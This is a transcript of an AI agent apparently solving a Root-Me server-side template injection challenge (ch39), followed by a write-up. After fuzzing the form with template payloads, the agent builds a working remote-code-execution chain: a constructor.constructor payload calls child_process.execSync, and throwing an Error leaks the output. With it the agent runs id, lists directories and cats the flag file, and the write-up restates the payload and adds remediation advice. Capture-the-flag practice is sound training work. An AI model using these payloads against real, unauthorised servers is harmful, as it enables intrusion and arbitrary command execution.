@@ -1,0 +1,104 @@
+=== session start: zai/glm-5.2 ===
+PROMPT: resolve the challenge and give me flag on http://challenge01.root-me.org/web-serveur/ch39/ 
+  ↳ browser_launch {}
+  ↳ browser_navigate {"url": "http://challenge01.root-me.org/web-serveur/ch39/"}
+  ↳ browser_snapshot {}
+  ↳ browser_query_dom {"selector": "html"}
+  ↳ browser_evaluate_js {"expression": "document.documentElement.outerHTML"}
+  ↳ browser_type {"ref": "e0", "text": "1000"}
+  ↳ browser_type {"ref": "e1", "text": "500"}
+  ↳ browser_click {"ref": "e8"}
+  ↳ browser_wait_for {"network_idle": true}
+  ↳ browser_snapshot {}
+  ↳ http_history {"method": "POST"}
+Let me look at the actual POST request to the challenge and its response:
+  ↳ http_flow {"flow_id": 3560}
+  ↳ http_flow_body {"flow_id": 3560, "kind": "request"}
+  ↳ http_flow_body {"flow_id": 3560, "kind": "response"}
+This is a Node.js/Express app (`X-Powered-By: Express`). Challenge ch39 is likely SSTI (Server-Side Template Injection). Let me load the nodejs skill and test it.
+  ↳ load_skill {"stacks": ["nodejs"]}
+This is Express/Node.js. Challenge ch39 is about SSTI. Let me test the input fields with SSTI payloads to identify the template engine.
+  ↳ http_fuzz {"body": "salary=FUZZ&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "marker": "FUZZ", "match_regex": "49", "method": "POST", "payloads": ["${7*7}", "#{7*7}", "{{7*7}}", "<%= 7*7 %>", "{7*7}", "#{ 7*7 }", "{{= 7*7}}"], "url": "http://challenge01.root-me.org:59039/"}
+`{{7*7}}` evaluates to 49 — confirmed SSTI. The `{{ }}` syntax suggests Nunjucks (a Jinja2-like engine for Node.js). Let me look at the response and try RCE.
+  ↳ http_request {"body": "salary={{7*7}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+`{{7*7}}` matched `49` — SSTI confirmed. Let me verify with a string marker and identify the engine:
+  ↳ http_request {"body": "salary={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+  ↳ http_request {"body": "salary=49&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Let me look more carefully at where the `49` appears in the `{{7*7}}` response:
+  ↳ http_fuzz {"body": "salary={{7*7}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "marker": "NONE", "method": "POST", "payloads": ["x"], "url": "http://challenge01.root-me.org:59039/"}
+Let me carefully capture the actual response body for the `{{7*7}}` case to see where the `49` appears:
+  ↳ http_request {"body": "salary={{7*7}}&housing={{7*7}}&phone={{7*7}}&transport={{7*7}}&insurance={{7*7}}&credits={{7*7}}&taxes={{7*7}}&hobbies={{7*7}}", "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+You're right — I was repeating myself. Let me stop and actually read the evidence from the journal to understand whether SSTI is real or a false positive.
+
+The `salary=49` test returned the **same** body (same ETag) as `salary={{7*7}}` — both showed empty/NaN, which is suspicious. Let me check the actual journal entries from the fuzz that "matched" 49.
+  ↳ http_history {"host": "challenge01.root-me.org", "limit": 15, "url_contains": ":59039"}
+Let me look more carefully. The earlier fuzz showed `{{7*7}}` → length 2394 matched `49`, but my manual `http_request` (length 2388) showed NaN. The difference: I forgot the `Content-Type` header. Let me redo it correctly and inspect where "49" appears.
+  ↳ http_request {"body": "salary={{7*7}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Now I see it clearly. With the correct `Content-Type` header:
+- **Salary field** shows `{{7*7}}` literally (raw value reflection in HTML attribute)
+- **Remainder field** shows `49` — the template engine **evaluated** `{{7*7}}` → SSTI **CONFIRMED**
+
+My earlier RCE attempt failed because I omitted the `Content-Type` header (so the body wasn't parsed). Let me retry the Nunjucks RCE payload correctly:
+  ↳ http_request {"body": "salary={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+  ↳ export {"result": "SSTI confirmed: {{7*7}} evaluates to 49. Template engine returns ReferenceError, so code IS being executed. Need to find a valid payload for this specific engine."}
+SSTI is confirmed, and we can see errors are reflected back. The engine isn't Nunjucks (since `range` isn't available). Let me identify the engine by testing more SSTI payloads — the `{{ }}` syntax with this behavior suggests it might be Mustache/Handlebars or a simple `eval`. Let me probe with a marker and different syntaxes:
+  ↳ http_fuzz {"body": "salary=FUZZ&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "marker": "FUZZ", "match_regex": "MARKERZ99|49|Hello|node", "method": "POST", "payloads": ["{{7*7}}", "{{7*'7'}}", "#{7*7}", "${7*7}", "<%=7*7%>", "{{constructor.constructor('return global.process.mainModule')()}}", "{{global}}", "{{process}}", "{{this}}", "{{this.constructor}}", "{{'MARKERZ99'}}", "{{= MARKERZ99 }}"], "url": "http://challenge01.root-me.org:59039/"}
+Several payloads match. The `{{7*'7'}}` → 49 indicates JavaScript coercion (7 * "7" = 49 in JS), confirming JS-based evaluation. Let me read the actual reflections of `{{this}}` and `{{process}}` to find an RCE path:
+  ↳ http_request {"body": "salary={{this}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Interesting — `{{this}}` → NaN (object can't be parsed as number). The error messages are reflected, which is very useful for debugging. Let me check what objects are available in the template context and try RCE paths:
+  ↳ http_request {"body": "salary={{constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+The `constructor.constructor()` didn't error (returned NaN = parsed as number), which means **code execution works** but the output is parsed as a number. I need to leak the output. Let me throw an error containing the command output — error messages are reflected directly:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"id\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+**RCE confirmed!** The output is in the Remainder field: `Error: uid=1171(web-serveur-ch39) gid=1171(web-serveur-ch39) groupes=1171(web-serveur-ch39),100(users)`
+
+Now I need to find the flag. Let me list the directory and look for a flag file:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"ls -la /\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+I can see the directory listing. Let me check the `/challenge` directory, which likely contains the flag:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"ls -la /challenge\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+There's a `web-serveur` directory. Let me find the ch39 directory and the flag file:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"find /challenge/web-serveur -maxdepth 2 -name *ch39* -o -path *ch39*\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Permission denied on `/challenge/web-serveur`. The flag is likely near the running app. Let me check the working directory and look for a password file:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"pwd; ls -la; find / -name .passwd 2>/dev/null; find / -name flag* 2>/dev/null\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"pwd && ls -la\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "timeout_ms": 30000, "url": "http://challenge01.root-me.org:59039/"}
+The `&&` was interpreted as HTML-escaped. Let me use a simpler approach with separate commands or semicolons (but avoid characters that need escaping). Let me check `pwd` alone first, then look for the flag using known root-me locations:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"pwd\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Working directory is `/challenge/web-serveur/ch39`. Let me list its contents and find the flag file:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"ls -la /challenge/web-serveur/ch39\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+I see a suspicious directory `??????????????????`. Let me check its contents:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"ls -la /challenge/web-serveur/ch39/S3cr3tEv0d3f0ld3r\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+Found it! There's a file `????????` in the secret folder. Let me read it:
+  ↳ http_request {"body": "salary={{constructor.constructor('throw new Error(global.process.mainModule.require(\"child_process\").execSync(\"cat /challenge/web-serveur/ch39/S3cr3tEv0d3f0ld3r/Ev0d3fl4g\").toString())')()}}&housing=&phone=&transport=&insurance=&credits=&taxes=&hobbies=", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "method": "POST", "url": "http://challenge01.root-me.org:59039/"}
+I found the flag. Let me export it and close the browser:
+  ↳ export {"result": "????????????????????"}
+  ↳ browser_close {}
+## Challenge Solved ✅
+
+### Flag
+```
+??????????????????????
+```
+
+### Vulnerability: Server-Side Template Injection (SSTI) → Remote Code Execution
+
+**Target:** `http://challenge01.root-me.org:59039/` (Node.js / Express)
+
+**Root cause:** The `salary` POST parameter is concatenated directly into a server-side template rather than being passed as template data, so the `{{ }}` syntax of the Ejs-like template engine evaluates attacker-supplied expressions as JavaScript.
+
+**Exploitation chain:**
+
+1. **Detect** — `salary={{7*7}}` returned `49` in the "Remainder" field → arithmetic evaluated server-side (SSTI confirmed).
+
+2. **Identify / escalate to RCE** — the engine exposes `constructor.constructor`, so `Function()` is reachable. Direct `execSync` output was swallowed (parsed as number → `NaN`), but the app reflects exception messages, so wrapping the output in a `throw new Error(...)` exfiltrates the result:
+
+   ```
+   POST / HTTP/1.1
+   Content-Type: application/x-www-form-urlencoded
+
+   salary={{constructor.constructor('throw new Error(global.process.mainModule.require("child_process").execSync("id").toString())')()}}
+   ```
+   → `Error: uid=1171(web-serveur-ch39) ...` (RCE confirmed).
+
+3. **Flag retrieval** — enumerated `/challenge/web-serveur/ch39/`, found a hidden folder `??????????????????????????`, and `cat`ed it via the same RCE primitive.
+
+### Remediation
+Render user input strictly as **template data** (e.g. `res.render('view', { salary: req.body.salary })`), never build the template string from input; and disable / sandbox code-evaluation features of the template engine. Validate that `salary` (and all fields) are numeric via a schema before use.
